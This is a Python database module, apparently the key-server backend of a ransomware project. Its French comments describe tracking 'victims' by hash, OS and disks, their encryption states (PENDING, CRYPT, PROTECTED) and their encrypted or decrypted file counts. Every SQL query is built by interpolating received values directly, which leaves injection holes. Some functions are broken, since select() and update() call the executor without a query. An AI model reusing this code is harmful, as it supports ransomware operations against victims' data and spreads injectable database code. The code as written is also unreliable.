import sqlite3


def connect_to_DB(path="../serveur_cles/data/victims.sqlite"):
    """
    :param path:chemin vers l'endroit où se trouve la bd
    :return:retourne la connexion et le curseur pour exécuter les commande sql
    """
    connection = None
    cursor = None

    try:
        connection = sqlite3.connect(path)
        cursor = connection.cursor()

    except sqlite3.Error as e:
        print(f"Une erreur est survenue dans la connexion: {e}")

    return connection, cursor


def select(request, nom_table, condition=None, conn=None, cursor=None):
    """
    cette fonction s'occupe de creer une requête sql qui return un string si conn et cursor si ne sont pas renseigné
    pour l'utiliser plus tard ou l'executer directement si le conn et cursor sont renseigné :param request:si request
    est une liste, il va séparer les éléments correctement (si[os,hash]--> select os, hash from...) :param
    nom_table:nom de la table à selectionner (from victims....) :param condition:renseigne la condition WHERE si non
    renseigné --> ignoré :return: si con et cursor renseigné: execution la commande sql sinon: retourne la commande
    sql en string
    """

    query = f"SELECT "

    if type(request) is list:
        for x in request:
            query += x + ", "
        query = query[0:-2]
    else:
        query += request

    if condition:
        query += " FROM " + str(nom_table) + " WHERE " + condition
    else:
        query += " FROM " + str(nom_table)
    if conn and cursor:
        result = execute_query(conn, cursor)
        return result

    else:
        return query


def insert(table, value, conn=None, cursor=None):
    """
    :param conn:
    :param cursor:
    :param table:table dans laquelle il faut ajouter des valeurs
    :param value:valeur à ajouter dans la table
    :return:la commande sql insert
    """
    query = f"INSERT INTO {table} ("

    for x in value:
        query += x + ", "
    query = query[0:-2] + ") VALUES ("

    for x in value:
        query += str(value[x]) + ", "
    query = query[0:-2] + ")"

    if conn and cursor:
        result = execute_query(conn, cursor, query)
        return result

    else:
        return query


def update(table_name, tuple_name, new_value, id_tuple=None, conn=None, cursor=None):
    """
    cette fonction creer une requête de type update avec ou sans condition
    :param cursor:
    :param conn:
    :param table_name:nom table à mettre à jour
    :param tuple_name:nom tuple à mettre à jour
    :param new_value:nouvelle valeur pour le(s) tuple(s)
    :param id_tuple:id utilisé dans la condition
    :return:
    """
    if id_tuple:
        query = f"UPDATE {table_name} SET {tuple_name} = '{new_value}' WHERE id = {id_tuple}"

    else:
        query = f"UPDATE {table_name} SET {tuple_name} = '{new_value}'"

    if conn and cursor:
        result = execute_query(conn, cursor)
        return result

    else:
        return query


def get_victim_list(path="../serveur_cles/data/victims.sqlite"):
    """
    cette fonction construit une commande sql qui demande l'historique des changements d'état d'une victime du
    ransomware.
    :return: un dictionnaire comprenant tous les l'id, l'hash, les disks, id_state, nb_files de toutes les victims
    """
    conn, cursor = connect_to_DB(path)
    # Pending
    query = "SELECT v.id_victim, v.hash, v.os, v.disks, s.state, e.nb_file FROM victims v JOIN states s ON " \
            "v.id_victim = s.id_victim JOIN encrypted e ON v.id_victim = e.id_victim WHERE s.state = 'PENDING'"
    result_pending = execute_query(conn, cursor, query)

    # PROTECTED
    query = "SELECT v.id_victim, v.hash, v.os, v.disks, s.state, de.nb_file FROM victims v JOIN states s ON " \
            "v.id_victim = s.id_victim JOIN decrypted de ON v.id_victim = de.id_victim WHERE s.state = 'PROTECTED'"
    result_protected = execute_query(conn, cursor, query)

    # Autre
    query = "SELECT v.id_victim, v.hash, v.os, v.disks, s.state, null FROM victims v JOIN states s ON " \
            "v.id_victim = s.id_victim WHERE s.state NOT IN ('PROTECTED', 'PENDING')"
    result_other = execute_query(conn, cursor, query)
    disconnect_from_DB(conn)
    return result_pending, result_protected, result_other


def change_state(recv_data, path="../serveur_cles/data/victims.sqlite"):
    """
    cette fonction change l'état d'une victime dans le ransomware si et seulement l'état était PENDING ou CRYPT
    :param recv_data: le dictionnaire CHANGE_STATE qui permet de récupérer l'id concerné
    """
    conn, cursor = connect_to_DB(path)
    query = f"SELECT s.state FROM states s WHERE id_victim = {recv_data['CHGSTATE']}"
    if (execute_query(conn, cursor, query))[0][0] in ['PENDING', 'CRYPT']:
        query = f"UPDATE states SET state ='{recv_data['STATE']}' WHERE id_victim = {recv_data['CHGSTATE']}"
        execute_query(conn, cursor, query)
        disconnect_from_DB(conn)


def get_history(recv_data, path="../serveur_cles/data/victims.sqlite"):
    '''
    Cette fonction récupère l'historique d'une victime d'un ransomware au moyen de la requête ci-dessous
    :param recv_data: le dictionnaire HISTORY_REQ qui permet de récupérer l'id concerné
    :return: le résultat de la requête, l'historique de la victime x
    '''
    conn, cursor = connect_to_DB(path)
    condition = execute_query(conn, cursor, f'SELECT state FROM states WHERE id_victim = {recv_data["HIST_REQ"]}')

    if condition[0][0] == 'PENDING':
        query = f"SELECT s.id_state, s.datetime, s.state, e.nb_file FROM states s JOIN encrypted e ON s.id_victim = " \
            f"e.id_victim WHERE s.id_victim = {recv_data['HIST_REQ']} "

    elif condition[0][0] == 'PROTECTED':
        query = f"SELECT s.id_state, s.datetime, s.state, de.nb_file FROM states s JOIN decrypted de ON s.id_victim = " \
            f"de.id_victim WHERE s.id_victim = {recv_data['HIST_REQ']} "

    else:
        query = f"SELECT s.id_state, s.datetime, s.state, null FROM states s WHERE s.id_victim = {recv_data['HIST_REQ']} "

    result = execute_query(conn, cursor, query)
    disconnect_from_DB(conn)
    return result


def execute_query(connection, cursor, query):
    """
    cette fonction execute les commandes sql
    :param connection: objet sqlite relative à la connection de la bd (carte d'identité)
    :param cursor:afin d'exécuter nos requêtes, nous allons utiliser le cursor recupéré en faisant appel à la fonction:
    connection = sqlite3.connect(path)
    :param query:est la commande sql à executer
    :return:si con et cursor renseigné: execution la commande sql
                                 sinon: retourne la commande sql en string
    """
    result = None
    try:
        cursor.execute(query)  # execute la commande sql
        connection.commit()

        if query[0:6] == "SELECT":  # detecte si c'est un "select"
            result = cursor.fetchall()

    except sqlite3.Error as e:
        print(f"Erreur survenue dans l'execution de la requête: {e}")

    return result


def disconnect_from_DB(connection):
    """
    cette fonction s'occupe de déconnecter la bd
    :param connection: objet sqlite relative à la connection de la bd (carte d'identité)
    """
    try:
        connection.close()

    except sqlite3.Error as e:
        print(f"Une erreur est survenue dans la déconnexion: {e}")  # detecte l'erreur à la deconnection
